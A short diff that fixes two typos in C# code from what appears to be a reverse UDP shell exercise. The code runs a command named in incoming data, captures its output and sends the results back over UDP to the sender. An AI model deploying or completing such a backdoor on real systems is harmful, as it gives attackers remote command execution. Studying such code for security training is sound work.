@@ -40,7 +40,7 @@ namespace ch1_reverse_udp {
           try {
             Process prc = new Process();
             prc.StartInfo = new ProcessStartInfo();
-            prc.StartInfo.Filename = filename;
+            prc.StartInfo.FileName = filename;
             prc.StartInfo.Arguments = arg;
             prc.StartInfo.UseShellExecute = false;
             prc.StartInfo.RedirectStandardOutput = true;
@@ -51,7 +51,7 @@ namespace ch1_reverse_udp {
             results = "There was and error running the command: " + filename;
           }
 
-          using (Socket sock = new Socket (AddressFamily.InterNetwork, SocketType.Dgram, ProtocalType.Udp)) {
+          using (Socket sock = new Socket (AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)) {
             IPAddress sender = localEP.Address;
             IPEndPoint remoteEP = new IPEndPoint(sender, lport);
             byte[] resultsBytes = Encoding.ASCII.GetBytes(results);
